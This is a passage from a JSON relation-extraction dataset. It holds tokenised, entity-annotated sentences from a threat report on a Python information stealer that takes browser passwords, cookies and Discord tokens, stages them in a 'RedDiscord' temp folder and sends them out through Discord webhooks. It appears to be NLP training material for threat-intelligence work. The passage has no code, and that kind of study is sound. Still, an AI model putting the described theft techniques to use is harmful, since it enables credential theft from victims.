"pos": [5, 6], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "It", "pos": [0, 1], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [68, 68], "name": "IPInfo service", "pos": [18, 20], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [81, 81], "name": "Discord server", "pos": [31, 33], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [96, 96], "name": "malware", "pos": [9, 10], "index": "9_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [105, 105], "name": "Chrome", "pos": [18, 19], "index": "10_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [117, 117], "name": "Mozilla Firefox", "pos": [6, 8], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [130, 130], "name": "information stealer", "pos": [1, 3], "index": "12_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [136, 136], "name": "Discord", "pos": [7, 8], "index": "13_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [138, 138], "name": "Roblox", "pos": [9, 10], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [145, 145], "name": "malware", "pos": [4, 5], "index": "15_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [150, 150], "name": "them", "pos": [9, 10], "index": "16_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [183, 183], "name": "RedDiscord", "pos": [24, 25], "index": "17_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 6}, {"r": "FR", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1], "h": 4, "t": 5}, {"r": "RF", "evidence": [1], "h": 4, "t": 5}, {"r": "IJ", "evidence": [2], "h": 6, "t": 7}, {"r": "ST", "evidence": [2], "h": 6, "t": 8}, {"r": "RF", "evidence": [2], "h": 6, "t": 8}, {"r": "RD", "evidence": [3], "h": 9, "t": 10}, {"r": "RD", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "RD", "evidence": [3, 4], "h": 9, "t": 11}, {"r": "RD", "evidence": [3, 4], "h": 9, "t": 11}, {"r": "WR", "evidence": [3, 4], "h": 9, "t": 11}, {"r": "RD", "evidence": [3, 4, 5], "h": 9, "t": 13}, {"r": "RD", "evidence": [3, 4, 5], "h": 9, "t": 14}, {"r": "RD", "evidence": [3, 4, 5, 6], "h": 9, "t": 16}, {"r": "RD", "evidence": [3, 4, 5, 6], "h": 9, "t": 16}, {"r": "WR", "evidence": [3, 4, 5, 6], "h": 9, "t": 16}, {"r": "CO", "evidence": [3, 4, 5], "h": 9, "t": 12}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 9, "t": 15}, {"r": "RD", "evidence": [5], "h": 12, "t": 13}, {"r": "WR", "evidence": [5], "h": 12, "t": 13}, {"r": "RD", "evidence": [5], "h": 12, "t": 14}, {"r": "WR", "evidence": [5], "h": 12, "t": 14}, {"r": "WR", "evidence": [6, 7], "h": 15, "t": 17}, {"r": "RD", "evidence": [6, 7], "t": 16, "h": 17}, {"r": "WR", "evidence": [6, 7], "t": 16, "h": 17}]}, {"title": "608-39", "sents": [["It", "leverages", "Discord", "Webhooks", "for", "C2", "and", "data", "exfiltration", "."], ["It", "collects", "survey", "information", "from", "the", "infected", "machine", ",", "obtains", "the", "geographic", "location", "of", "the", "system", "via", "the", "IPInfo", "service", ",", "takes", "screenshots", "and", "eventually", "transmits", "that", "data", "to", "an", "attacker-controlled", "Discord", "server", "in", "JSON", "format", "."], ["In", "addition", "to", "the", "previously", "listed", "applications", ",", "the", "malware", "also", "supports", "retrieving", "password", "and", "cookie", "data", "from", "Chrome", ",", "as", "shown", "below", "."], ["Similar", "functionality", "also", "exists", "to", "target", "Mozilla", "Firefox", "browser", "data", "that", "may", "be", "present", "on", "the", "system", "."], ["The", "information", "stealer", "is", "particularly", "interested", "in", "Discord", "and", "Roblox", "data", "."], ["If", "discovered", ",", "the", "malware", "will", "attempt", "to", "bypass", "them", "to", "obtain", "Discord", "tokens", "from", "the", "victim", "."], ["Application", "data", "that", "is", "collected", "is", "stored", "within", "a", "directory", "structure", "inside", "of", "the", "%", "TEMP", "%", "directory", ",", "in", "a", "folder", "called", "``", "RedDiscord", "''", "that", "is", "created", "by", "the", "malware", "."], ["Before", "exfiltrating", "the", "data", ",", "the", "malware", "creates", "a", "ZIP", "archive", "within", "the", "RedDiscord", "directory", "called", "``", "Hannabi-", "<", "USERNAME", ">", ".zip", "''", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "Discord Webhooks", "pos": [2, 4], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [5, 5], "name": "C2", "pos": [5, 6], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [10, 10], "name": "It", "pos": [0, 1], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [28, 28], "name": "IPInfo service", "pos": [18, 20], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [41, 41], "name": "Discord server", "pos": [31, 33], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [56, 56], "name": "malware", "pos": [9, 10], "index": "6_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [65, 65], "name": "Chrome", "pos": [18, 19], "index": "7_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [77, 77], "name": "Mozilla Firefox", "pos": [6, 8], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [90, 90], "name": "information stealer", "pos": [1, 3], "index": "9_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [96, 96], "name": "Discord", "pos": [7, 8], "index": "10_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [98, 98], "name": "Roblox", "pos": [9, 10], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [105, 105], "name": "malware", "pos": [4, 5], "index": "12_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [110, 110], "name": "them", "pos": [9, 10], "index": "13_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [143, 143], "name": "RedDiscord", "pos": [24, 25], "index": "14_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [155, 155], "name": "data", "pos": [3, 4], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [158, 158], "name": "malware", "pos": [6, 7], "index": "16_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [161, 161], "name": "ZIP archive", "pos": [9, 11], "index": "17_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [169, 169], "name": "Hannabi- < USERNAME > .zip", "pos": [17, 22], "index": "18_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 1, "t": 2}, {"r": "RF", "evidence": [0], "h": 1, "t": 2}, {"r": "IJ", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1], "h": 3, "t": 5}, {"r": "RF", "evidence": [1], "h": 3, "t": 5}, {"r": "RD", "evidence": [2], "h": 6, "t": 7}, {"r": "RD", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "RD", "evidence": [2, 3], "h": 6, "t": 8}, {"r": "RD", "evidence": [2, 3], "h": 6, "t": 8}, {"r": "WR", "evidence": [2, 3], "h": 6, "t": 8}, {"r": "RD", "evidence": [2, 3, 4], "h": 6, "t": 10}, {"r": "RD", "evidence": [2, 3, 4], "h": 6, "t": 11}, {"r": "RD", "evidence": [2, 3, 4, 5], "h": 6, "t": 13}, {"r": "RD", "evidence": [2, 3, 4, 5], "h": 6, "t": 13}, {"r": "WR", "evidence": [2, 3, 4, 5], "h": 6, "t": 13}, {"r": "CO", "evidence": [2, 3, 4], "h": 6, "t": 9}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 6, "t": 12}, {"r": "CO", "evidence": [2, 3, 4, 5, 6, 7], "h": 6, "t": 16}, {"r": "RD", "evidence": [4], "h": 9, "t": 10}, {"r": "WR", "evidence": [4], "h": 9, "t": 10}, {"r": "RD", "evidence": [4], "h": 9, "t": 11}, {"r": "WR", "evidence": [4], "h": 9, "t": 11}, {"r": "WR", "evidence": [5, 6], "h": 12, "t": 14}, {"r": "RD", "evidence": [5, 6], "t": 13, "h": 14}, {"r": "WR", "evidence": [5, 6], "t": 13, "h": 14}, {"r": "CO", "evidence": [6, 7], "h": 14, "t": 15}, {"r": "WR", "evidence": [7], "h": 16, "t": 17}, {"r": "CO", "evidence": [7], "h": 17, "t": 18}]}, {"title": "608-40", "sents": [["It", "collects", "survey", "information", "from", "the", "infected", "machine", ",", "obtains", "the", "geographic", "location", "of", "the", "system", "via", "the", "IPInfo", "service", ",", "takes", "screenshots", "and", "eventually", "transmits", "that", "data", "to", "an", "attacker-controlled", "Discord", "server", "in", "JSON", "format", "."], ["In", "addition", "to", "the", "previously", "listed", "applications", ",", "the", "malware", "also", "supports", "retrieving", "password", "and", "cookie", "data", "from", "Chrome", ",", "as", "shown", "below", "."], ["Similar", "functionality", "also", "exists", "to", "target", "Mozilla", "Firefox", "browser", "data", "that", "may", "be", "present", "on", "the", "system", "."], ["The", "information", "stealer", "is", "particularly", "interested", "in", "Discord", "and", "Roblox", "data", "."], ["If", "discovered", ",", "the", "malware", "will", "attempt", "to", "bypass", "them", "to", "obtain", "Discord", "tokens", "from", "the", "victim", "."], ["Application", "data", "that", "is", "collected", "is", "stored", "within", "a", "directory", "structure", "inside", "of", "the", "%", "TEMP", "%", "directory", ",", "in", "a", "folder", "called", "``", "RedDiscord", "''", "that", "is", "created", "by", "the", "malware", "."], ["Before", "exfiltrating", "the", "data", ",", "the", "malware", "creates", "a", "ZIP", "archive", "within", "the", "RedDiscord", "directory", "called", "``", "Hannabi-", "<", "USERNAME", ">", ".zip", "''", "."], ["The", "malware", "first", "transmits", "beacon", "information", "and", "will", "then", "attempt", "to", "exfiltrate", "the", "newly", "created", "ZIP", "archive", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [18, 18], "name": "IPInfo service", "pos": [18, 20], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [31, 31], "name": "Discord server", "pos": [31, 33], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [46, 46], "name": "malware", "pos": [9, 10], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [55, 55], "name": "Chrome", "pos": [18, 19], "index": "4_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [67, 67], "name": "Mozilla Firefox", "pos": [6, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [80, 80], "name": "information stealer", "pos": [1, 3], "index": "6_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [86, 86], "name": "Discord", "pos": [7, 8], "index": "7_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [88, 88], "name": "Roblox", "pos": [9, 10], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [95, 95], "name": "malware", "pos": [4, 5], "index": "9_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [100, 100], "name": "them", "pos": [9, 10], "index": "10_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [133, 133], "name": "RedDiscord", "pos": [24, 25], "index": "11_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [145, 145], "name": "data", "pos": [3, 4], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [148, 148], "name": "malware", "pos": [6, 7], "index": "13_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [151, 151], "name": "ZIP archive", "pos": [9, 11], "index": "14_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [159, 159], "name": "Hannabi- < USERNAME > .zip", "pos": [17, 22], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [167, 167], "name": "malware", "pos": [1, 2], "index": "16_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [170, 170], "name": "beacon information", "pos": [4, 6], "index": "17_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [181, 181], "name": "ZIP archive", "pos": [15, 17], "index": "18_0"}]], "labels": [{"r": "IJ", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "RD", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "RD", "evidence": [1, 2, 3], "h": 3, "t": 7}, {"r": "RD", "evidence": [1, 2, 3], "h": 3, "t": 8}, {"r": "RD", "evidence": [1, 2, 3, 4], "h": 3, "t": 10}, {"r": "RD", "evidence": [1, 2, 3, 4], "h": 3, "t": 10}, {"r": "WR", "evidence": [1, 2, 3, 4], "h": 3, "t": 10}, {"r": "CO", "evidence": [1, 2, 3], "h": 3, "t": 6}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 3, "t": 9}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6], "h": 3, "t": 13}, {"r": "CO", "evidence": [1, 2, 3, 4, 5, 6, 7], "h": 3, "t": 16}, {"r": "RD", "evidence": [3], "h": 6, "t": 7}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "RD", "evidence": [3], "h": 6, "t": 8}, {"r": "WR", "evidence": [3], "h": 6, "t": 8}, {"r": "WR", "evidence": [4, 5], "h": 9, "t": 11}, {"r": "RD", "evidence": [4, 5], "t": 10, "h": 11}, {"r": "WR", "evidence": [4, 5], "t": 10, "h": 11}, {"r": "CO", "evidence": [5, 6], "h": 11, "t": 12}, {"r": "WR", "evidence": [6], "h": 13, "t": 14}, {"r": "CO", "evidence": [6], "h": 14, "t": 15}, {"r": "CO", "evidence": [6, 7], "t": 14, "h": 18}]}, {"title": "608-41", "sents": [["In", "addition", "to", "the", "previously", "listed", "applications", ",", "the", "malware", "also", "supports", "retrieving", "password", "and", "cookie", "data", "from", "Chrome", ",", "as", "shown", "below", "."], ["Similar", "functionality", "also", "exists", "to", "target", "Mozilla", "Firefox", "browser", "data", "that", "may", "be", "present", "on", "the", "system", "."], ["The", "information", "stealer", "is", "particularly", "interested", "in", "Discord", "and", "Roblox", "data", "."], ["If", "discovered", ",", "the", "malware", "will", "attempt", "to", "bypass", "them", "to", "obtain", "Discord", "tokens", "from", "the", "victim", "."], ["Application", "data", "that", "is", "collected", "is", "stored", "within", "a", "directory", "structure", "inside", "of", "the", "%", "TEMP", "%", "directory", ",", "in", "a", "folder", "called", "``", "RedDiscord", "''", "that", "is", "created", "by", "the", "malware", "."], ["Before", "exfiltrating", "the", "data", ",", "the", "malware", "creates", "a", "ZIP", "archive", "within", "the", "RedDiscord", "directory", "called", "``", "Hannabi-", "<", "USERNAME", ">", ".zip", "''", "."], ["The", "malware", "first", "transmits", "beacon", "information", "and", "will", "then", "attempt", "to", "exfiltrate", "the", "newly", "created", "ZIP", "archive", "."], ["Typically", ",", "attackers", "will", "attempt", "to", "leverage", "PyInstaller", "or", "Py2EXE", "to", "compile", "their", "Python", "into", "a", "PE32", "file", "format", "prior", "to", "distributing", "it", "to", "victims", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "malware", "pos": [9, 10], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [18, 18], "name": "Chrome", "pos": [18, 19], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [30, 30], "name": "Mozilla Firefox", "pos": [6, 8], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [43, 43], "name": "information stealer", "pos": [1, 3], "index": "3_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [49, 49], "name": "Discord", "pos": [7, 8], "index": "4_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [51, 51], "name": "Roblox", "pos": [9, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [58, 58], "name": "malware", "pos": [4, 5], "index": "6_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [63, 63], "name": "them", "pos": [9, 10], "index": "7_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [96, 96], "name": "RedDiscord", "pos": [24, 25], "index": "8_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [108, 108], "name": "data", "pos": [3, 4], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [111, 111], "name": "malware", "pos": [6, 7], "index": "10_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [114, 114], "name": "ZIP archive", "pos": [9, 11], "index": "11_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [122, 122], "name": "Hannabi- < USERNAME > .zip", "pos": [17, 22], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [130, 130], "name": "malware", "pos": [1, 2], "index": "13_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [133, 133], "name": "beacon information", "pos": [4, 6], "index": "14_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [144, 144], "name": "ZIP archive", "pos": [15, 17], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [149, 149], "name": "attackers", "pos": [2, 3], "index": "16_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [154, 154], "name": "PyInstaller", "pos": [7, 8], "index": "17_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [156, 156], "name": "Py2EXE", "pos": [9, 10], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [160, 160], "name": "Python", "pos": [13, 14], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [163, 163], "name": "PE32 file", "pos": [16, 18], "index": "20_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RD", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RD", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": "RD", "evidence": [0, 1, 2], "h": 0, "t": 5}, {"r": "RD", "evidence": [0, 1, 2, 3], "h": 0, "t": 7}, {"r": "RD", "evidence": [0, 1, 2, 3], "h": 0, "t": 7}, {"r": "WR", "evidence": [0, 1, 2, 3], "h": 0, "t": 7}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 0, "t": 6}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5], "h": 0, "t": 10}, {"r": "CO", "evidence": [0, 1, 2, 3, 4, 5, 6], "h": 0, "t": 13}, {"r": "RD", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2], "h": 3, "t": 4}, {"r": "RD", "evidence": [2], "h": 3, "t": 5}, {"r": "WR", "evidence": [2], "h": 3, "t": 5}, {"r": "WR", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "RD", "evidence": [3, 4], "t": 7, "h": 8}, {"r": "WR", "evidence": [3, 4], "t": 7, "h": 8}, {"r": "CO", "evidence": [4, 5], "h": 8, "t": 9}, {"r": "WR", "evidence": [5], "h": 10, "t": 11}, {"r": "CO", "evidence": [5], "h": 11, "t": 12}, {"r": "CO", "evidence": [5, 6], "t": 11, "h": 15}, {"r": "FR", "evidence": [7], "h": 16, "t": 17}, {"r": "FR", "evidence": [7], "h": 16, "t": 18}, {"r": "RD", "evidence": [7], "h": 17, "t": 19}, {"r": "RD", "evidence": [7], "h": 18, "t": 19}, {"r": "WR", "evidence": [7], "h": 17, "t": 20}, {"r": "WR", "evidence": [7], "h": 17, "t": 20}, {"r": "WR", "evidence": [7], "h": 17, "t": 20}, {"r": "WR", "evidence": [7], "h": 17, "t": 20}]}, {"title": "608-42", "sents": [["Similar", "functionality", "also", "exists", "to", "target", "Mozilla", "Firefox", "browser", "data", "that", "may", "be", "present", "on", "the", "system", "."], ["The", "information", "stealer", "is", "particularly", "interested", "in", "Discord", "and", "Roblox", "data", "."], ["If", "discovered", ",", "the", "malware", "will", "attempt", "to", "bypass", "them", "to", "obtain", "Discord", "tokens", "from", "the", "victim", "."], ["Application", "data", "that", "is", "collected", "is", "stored", "within", "a", "directory", "structure", "inside", "of", "the", "%", "TEMP", "%", "directory", ",", "in", "a", "folder", "called", "``", "RedDiscord", "''", "that", "is", "created", "by", "the", "malware", "."], ["Before", "exfiltrating", "the", "data", ",", "the", "malware", "creates", "a", "ZIP", "archive", "within", "the", "RedDiscord", "directory", "called", "``", "Hannabi-", "<", "USERNAME", ">", ".zip", "''", "."], ["The", "malware", "first", "transmits", "beacon", "information", "and", "will", "then", "attempt", "to", "exfiltrate", "the", "newly", "created", "ZIP", "archive", "."], ["Typically", ",", "attackers", "will", "attempt", "to", "leverage", "PyInstaller", "or", "Py2EXE", "to", "compile", "their", "Python", "into", "a", "PE32", "file", "format", "prior", "to", "distributing", "it", "to", "victims", "."], ["This", "is", "a", "case", "where", "instead", ",", "the", "attacker", "chose", "to", "include", "a", "Python", "installation", "process", "during", "the", "infection", "and", "is", "leveraging", "Python", "directly", "to", "steal", "sensitive", "information", "from", "victims", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [6, 6], "name": "Mozilla Firefox", "pos": [6, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "information stealer", "pos": [1, 3], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [25, 25], "name": "Discord", "pos": [7, 8], "index": "2_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [27, 27], "name": "Roblox", "pos": [9, 10], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [34, 34], "name": "malware", "pos": [4, 5], "index": "4_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [39, 39], "name": "them", "pos": [9, 10], "index": "5_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [72, 72], "name": "RedDiscord", "pos": [24, 25], "index": "6_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [84, 84], "name": "data", "pos": [3, 4], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [87, 87], "name": "malware", "pos": [6, 7], "index": "8_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [90, 90], "name": "ZIP archive", "pos": [9, 11], "index": "9_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [98, 98], "name": "Hannabi- < USERNAME > .zip", "pos": [17, 22], "index": "10_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [106, 106], "name": "malware", "pos": [1, 2], "index": "11_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [109, 109], "name": "beacon information", "pos": [4, 6], "index": "12_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [120, 120], "name": "ZIP archive", "pos": [15, 17], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [125, 125], "name": "attackers", "pos": [2, 3], "index": "14_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [130, 130], "name": "PyInstaller", "pos": [7, 8], "index": "15_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [132, 132], "name": "Py2EXE", "pos": [9, 10], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [136, 136], "name": "Python", "pos": [13, 14], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [139, 139], "name": "PE32 file", "pos": [16, 18], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [157, 157], "name": "attacker", "pos": [8, 9], "index": "19_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [162, 162], "name": "Python installation", "pos": [13, 15], "index": "20_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [171, 171], "name": "Python", "pos": [22, 23], "index": "21_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [175, 175], "name": "sensitive information", "pos": [26, 28], "index": "22_0"}]], "labels": [{"r": "RD", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "RD", "evidence": [1], "h": 1, "t": 3}, {"r": "WR", "evidence": [1], "h": 1, "t": 3}, {"r": "WR", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "RD", "evidence": [2, 3], "t": 5, "h": 6}, {"r": "WR", "evidence": [2, 3], "t": 5, "h": 6}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 7}, {"r": "WR", "evidence": [4], "h": 8, "t": 9}, {"r": "CO", "evidence": [4], "h": 9, "t": 10}, {"r": "CO", "evidence": [4, 5], "t": 9, "h": 13}, {"r": "FR", "evidence": [6], "h": 14, "t": 15}, {"r": "FR", "evidence": [6], "h": 14, "t": 16}, {"r": "RD", "evidence": [6], "h": 15, "t": 17}, {"r": "RD", "evidence": [6], "h": 16, "t": 17}, {"r": "WR", "evidence": [6], "h": 15, "t": 18}, {"r": "WR", "evidence": [6], "h": 15, "t": 18}, {"r": "WR", "evidence": [6], "h": 15, "t": 18}, {"r": "WR", "evidence": [6], "h": 15, "t": 18}, {"r": "FR", "evidence": [7], "h": 19, "t": 21}, {"r": "WR", "evidence": [7], "h": 19, "t": 22}]}, {"title": "608-43", "sents": [["The", "information", "stealer", "is", "particularly", "interested", "in", "Discord", "and", "Roblox", "data", "."], ["If", "discovered", ",", "the", "malware", "will", "attempt", "to", "bypass", "them", "to", "obtain", "Discord", "tokens", "from", "the", "victim", "."], ["Application", "data", "that", "is", "collected", "is", "stored", "within", "a", "directory", "structure", "inside", "of", "the", "%", "TEMP", "%", "directory", ",", "in", "a", "folder", "called", "``", "RedDiscord", "''", "that", "is", "created", "by", "the", "malware", "."], ["Before", "exfiltrating", "the", "data", ",", "the", "malware", "creates", "a", "ZIP", "archive", "within", "the", "RedDiscord", "directory", "called", "``", "Hannabi-", "<", "USERNAME", ">", ".zip", "''", "."], ["The", "malware", "first", "transmits", "beacon", "information", "and", "will", "then", "attempt", "to", "exfiltrate", "the", "newly", "created", "ZIP", "archive", "."], ["Typically", ",", "attackers", "will", "attempt", "to", "leverage", "PyInstaller", "or", "Py2EXE", "to", "compile", "their", "Python", "into", "a", "PE32", "file", "format", "prior", "to", "distributing", "it", "to", "victims", "."], ["This", "is", "a", "case", "where", "instead", ",", "the", "attacker", "chose", "to", "include", "a", "Python", "installation", "process", "during", "the", "infection", "and", "is", "leveraging", "Python", "directly", "to", "steal", "sensitive", "information", "from", "victims", "."], ["ReverseShell-9974437-0Orbital", "QueriesCisco", "Secure", "Endpoint", "users", "can", "use", "Orbital", "Advanced", "Search", "to", "run", "complex", "OSqueries", "to", "see", "if", "their", "endpoints", "are", "infected", "with", "this", "specific", "threat", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "information stealer", "pos": [1, 3], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [7, 7], "name": "Discord", "pos": [7, 8], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [9, 9], "name": "Roblox", "pos": [9, 10], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [16, 16], "name": "malware", "pos": [4, 5], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [21, 21], "name": "them", "pos": [9, 10], "index": "4_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [54, 54], "name": "RedDiscord", "pos": [24, 25], "index": "5_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [66, 66], "name": "data", "pos": [3, 4], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [69, 69], "name": "malware", "pos": [6, 7], "index": "7_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [72, 72], "name": "ZIP archive", "pos": [9, 11], "index": "8_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [80, 80], "name": "Hannabi- < USERNAME > .zip", "pos": [17, 22], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [88, 88], "name": "malware", "pos": [1, 2], "index": "10_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [91, 91], "name": "beacon information", "pos": [4, 6], "index": "11_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [102, 102], "name": "ZIP archive", "pos": [15, 17], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [107, 107], "name": "attackers", "pos": [2, 3], "index": "13_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [112, 112], "name": "PyInstaller", "pos": [7, 8], "index": "14_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [114, 114], "name": "Py2EXE", "pos": [9, 10], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [118, 118], "name": "Python", "pos": [13, 14], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [121, 121], "name": "PE32 file", "pos": [16, 18], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [139, 139], "name": "attacker", "pos": [8, 9], "index": "18_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [144, 144], "name": "Python installation", "pos": [13, 15], 